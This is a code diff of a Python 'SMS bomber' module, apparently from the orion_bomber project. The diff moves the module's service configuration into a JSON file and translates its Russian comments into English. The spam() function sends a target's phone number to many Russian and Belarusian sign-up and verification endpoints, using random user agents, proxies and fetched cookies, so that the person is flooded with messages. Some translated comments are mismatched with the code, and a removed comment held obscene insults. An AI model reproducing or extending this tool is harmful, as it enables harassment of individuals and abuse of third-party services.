@@ -3,17 +3,49 @@ import time
 import requests
 from fake_useragent import UserAgent
 
-services_list = ["apteka.ru", "magnit", "telegram", "citi_link", "akbarsa", "yota", "b_apteka", "mir", "pochtabank", 'mt_free', "megafon.tv", "moezdorovie", "totopizza", "zdesapteka", "stockmann", "SberUslugi", "victoria", "sunlight", "citystar"]
+# services list
+services_list = []
+with open('tools/services.json') as f:
+    services = json.load(f)
+    services = services['ru'][0]
+    for i in services:
+        services_list.append(i)
 
 class Send:
-    def __init__(self):
+    def parse(self):
+        services_list = []
+        response_services = {}
+        time_out_ = {}
+        time_out_config = {}
+        cookie = {}
+        # load json
+        with open('tools/services.json') as f:
+            services = json.load(f)
+        services = services[self.country][0]
+        # services list
+        for i in services:
+            services_list.append(i)
+        # response services
+        for i in services:
+            response_services[i] = services[i]["response"]
+        # time_out countdown
+        for i in services:
+            time_out_[i] = 0
+        # time_out services
+        for i in services:
+            time_out_config[i] = services[i]["timeout"] + 5
+        # cookies services
+        for i in services:
+            if "cookies" in services[i]:
+                cookie[i] = services[i]["cookies"]
+        return services_list, response_services, time_out_, time_out_config, cookie
+
+    def __init__(self, country):
+        self.country = country
+        self.services_list, self.response_services, self.time_out_, self.time_out_config, self.cookie = self.parse()
         self.service = None
         self.service_data = None
         self.services = None
-        self.cookie = {'yota': 'https://tv.yota.ru/', 'megafon.tv': 'https://megafon.tv/', "zdesapteka": "https://zdesapteka.ru/", "sunlight": "https://sunlight.net/profile/login/?next_encoded=Lw=="}
-        self.response_services = {'apteka.ru': 200, 'magnit': "json", 'telegram': 200, 'citi_link': 200, 'akbarsa': 200, 'yota': 201, 'b_apteka': 200, 'mir': 200, 'pochtabank': 200, 'mt_free': "json", "megafon.tv": 201, "moezdorovie": 200, "totopizza": 200, "zdesapteka": 200, "stockmann": 200, "SberUslugi": 200, "victoria": 200, "sunlight": 200, "citystar": 200}
-        self.time_out_ = {'apteka.ru': 0, 'magnit': 0, 'telegram': 0, 'citi_link': 0, 'akbarsa': 0, 'yota': 0, 'b_apteka': 0, 'mir': 0, 'pochtabank': 0, 'mt_free': 0, "megafon.tv": 0, "moezdorovie": 0, "totopizza": 0, "zdesapteka": 0, "stockmann": 0, "SberUslugi": 0, "victoria": 0, "sunlight": 0, "citystar": 0}
-        self.time_out_config = {'apteka.ru': 120, 'magnit': 120, 'telegram': 120, 'citi_link': 60, 'akbarsa': 305, 'yota': 60, 'b_apteka': 60, 'mir': 60, 'pochtabank': 120, 'mt_free': 185, "megafon.tv": 600, "moezdorovie": 300, "totopizza": 65, "zdesapteka": 65, "stockmann": 600, "SberUslugi": 180, "victoria": 65, "sunlight": 35, "citystar": 185}
         self.default_headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
 				                'Accept-Encoding': 'gzip, deflate, br',
 				                'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -37,11 +69,11 @@ class Send:
                 else:
                     return False
             except:
-                print('error: что-то пошло не так (возможно в конфиге нету нужного сервиса)')
+                print('error: something went wrong (perhaps the required service is not in the config)')
                 return False
 
     def json_parse(self, payload, datatype, country, phone):
-        # Форматирование для России
+        # formatting for Russia
         if country == 'ru':
             for old, new in {
                 "'": '"',
@@ -57,7 +89,7 @@ class Send:
                 if old in payload:
                     payload = payload.replace(old, new)
             return datatype, payload
-        # Форматирование для Беларуси
+        # formatting for Belarus
         elif country == 'by':
             for old, new in {
                 "'": '"',
@@ -69,29 +101,29 @@ class Send:
                     payload = payload.replace(old, new)
             return datatype, payload
 
-    # Обработка json для последующего спама
+    # json processing for subsequent spam
     def json_processing(self, phone):
-        # Проверка страны
+        # check country
         if phone[1][:1] == '3':
             country = "by"
         else:
             country = "ru"
 
-        # Загрузка json
+        # load json
         with open('tools/services.json') as f:
             services = json.load(f)
-        # Получение сервисов по стране
+        # Getting services by country
         self.services = services[country][0]
         try:
             service = self.services[self.service]
-        except: # Если нужного сервиса не оказалось в json
+        except: # If the required service was not in json
             return False, False
         self.service_data = service
 
-        if "json" in service: # Если данные для запроса json
+        if "json" in service: # If the required service was not in json
             payload = service["json"]
             datatype = 'json'
-        elif "data" in service: # Если данные для запроса data
+        elif "data" in service: # If the required service was not in data
             payload = service["data"]
             datatype = 'data'
         else:
@@ -99,16 +131,16 @@ class Send:
 
         payload, datatype = self.json_parse(payload, datatype, country, phone)
 
-        # Проверка, нужно ли менять url
+        # Checking if the url needs to be changed
         if '*' in service["url"]:
-            data = [True, (self.json_parse(service["url"], "url", country, phone)), (payload, datatype)] # (True(с изменениями в url) or False, (payload, "url") - в случае True, (payload, "json or data"))
+            data = [True, (self.json_parse(service["url"], "url", country, phone)), (payload, datatype)] # (True(with change in url) or False; (payload, "url") - if True, (payload, "json or data"))
             return data
         else:
             data = [False, (payload, datatype)]
             return data
 
 
-    # Функция для спама
+    # Spam function
     def spam(self, service, phone, proxy=None):
         self.service = service
 
@@ -120,23 +152,23 @@ class Send:
                     datatype, payload = self.json_processing(phone)[2]
                 else:
                     datatype, payload = self.json_processing(phone)[1]
-            except: # Если передается только url
+            except: # If only url is passed
                 datatype = "url"
                 payloadUrl = self.json_processing(phone)[1]
-        else: # Если сервиса нет в json
+        else: # If the service is not in json
             return False, False
 
-        # Дата сервиса
+        # service data
         service = self.service_data
         if payloadUrl != '':
             url = payloadUrl
         else:
             url = service["url"]
 
-        # Генерируем headers
+        # generate headers
         ua = UserAgent().random
         try:
-            service["headers"]["User-Agent"] = ua # Здесь мы берем хедерсы с json, если конечно они там есть, иначе используем дефолтные
+            service["headers"]["User-Agent"] = ua
             headers = service["headers"]
         except:
             headers = self.default_headers
@@ -144,24 +176,24 @@ class Send:
 
         session = requests.Session()
 
-        # Получаем куки сайта (если нужны)
+        # Getting site cookies (if needed)
         cookies = None
         if self.service in self.cookie:
             cookies = session.get(self.cookie[self.service], headers=headers).cookies
 
-        # В зависимости от типа входных данных, добавляем их в запрос
+        # fill out the request
         json_ = None
         data = None
         if datatype == "json":
             json_ = json.loads(payload)
         elif datatype == "data":
             data = json.loads(payload)
-        elif self.service == "victoria": # для инвалида
+        elif self.service == "victoria":
             json_ = {"parameter": "{\"MobilePhone\":\"" + phone[0] + "\",\"CardNumber\":null,\"AgreeToTerms\":1,\"AllowNotification\":1}"}
 
-        # Отправляем запрос
+        # send a request
         try:
-            if self.service == 'pochtabank': # для инвалидов
+            if self.service == 'pochtabank':
                 session.post('https://my.pochtabank.ru/dbo/registrationService/ib')
                 r = session.put(url, json=json_, timeout=10, proxies=proxy)
             elif self.service == "zdesapteka":
@@ -180,5 +212,4 @@ class Send:
                 else:
                     return r.status_code, r.text
         except:
-            return False, False # Не нравиться? Иди нахуй предъяви нам, а нас ты сможешь найти только в нашем телеграм
-                                # канале, подписывайся и пиши нам свои жалобы личинус ебаный - https://t.me/orion_bomber
+            return False, False # https://t.me/orion_bomber
